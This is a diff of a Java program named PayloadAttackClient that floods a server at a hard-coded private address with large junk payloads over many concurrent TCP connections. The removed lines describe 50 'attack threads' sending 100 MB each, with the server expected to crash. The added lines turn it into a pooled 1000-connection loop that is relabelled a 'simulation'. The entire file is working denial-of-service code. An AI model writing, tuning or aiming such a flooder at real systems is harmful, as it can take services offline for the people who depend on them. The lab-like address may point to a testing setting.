@@ -2,47 +2,47 @@ import java.io.*;
 import java.net.*;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 
 public class PayloadAttackClient {
     private static final String SERVER_ADDRESS = "192.168.1.50";
     private static final int SERVER_PORT = 12345;
-    private static final int THREAD_COUNT = 50; // Number of simultaneous attackers
-    private static final int PAYLOAD_MB_PER_THREAD = 100; // Total MB each thread sends
+    private static final int WORKER_COUNT = 10; // Active threads in the pool
+    private static final int TOTAL_TASKS = 1000; // Total connection attempts to cycle through
+    private static final int PAYLOAD_SIZE = 1024 * 1024; // 1MB payload per connection
 
     public static void main(String[] args) {
-        ExecutorService executor = Executors.newFixedThreadPool(THREAD_COUNT);
+        // Use a pool to manage workers
+        ExecutorService executor = Executors.newFixedThreadPool(WORKER_COUNT);
+        byte[] buffer = new byte[PAYLOAD_SIZE];
+        java.util.Arrays.fill(buffer, (byte) 'A');
 
-        System.out.println("Launching " + THREAD_COUNT + " attack threads...");
+        System.out.println("Starting pooled simulation with " + WORKER_COUNT + " workers...");
 
-        for (int i = 0; i < THREAD_COUNT; i++) {
-            final int threadId = i;
+        for (int i = 0; i < TOTAL_TASKS; i++) {
+            final int taskId = i;
             executor.submit(() -> {
-                try (Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
-                     OutputStream out = socket.getOutputStream();
-                     PrintWriter writer = new PrintWriter(out, false)) {
-
-                    System.out.println("Thread-" + threadId + " connected.");
+                try (Socket socket = new Socket()) {
+                    // Set a timeout so a hung server doesn't stall your pool
+                    socket.connect(new InetSocketAddress(SERVER_ADDRESS, SERVER_PORT), 2000); 
                     
-                    // Pre-generate chunk to save client CPU
-                    String chunk = "A".repeat(1_000_000); 
-
-                    for (int j = 1; j <= PAYLOAD_MB_PER_THREAD; j++) {
-                        writer.print(chunk);
-                        if (j % 10 == 0) {
-                            writer.flush();
-                        }
+                    try (BufferedOutputStream out = new BufferedOutputStream(socket.getOutputStream())) {
+                        out.write(buffer);
+                        out.flush();
+                        System.out.println("Task " + taskId + ": Payload delivered.");
                     }
-
-                    // Send the trigger
-                    writer.println();
-                    writer.flush();
-                    System.out.println("Thread-" + threadId + " finished payload.");
-
                 } catch (IOException e) {
-                    System.err.println("Thread-" + threadId + " lost connection (Server likely crashing): " + e.getMessage());
+                    System.err.println("Task " + taskId + " failed: " + e.getMessage());
                 }
             });
         }
+
         executor.shutdown();
+        try {
+            executor.awaitTermination(1, TimeUnit.HOURS);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
+        System.out.println("Simulation complete.");
     }
 }
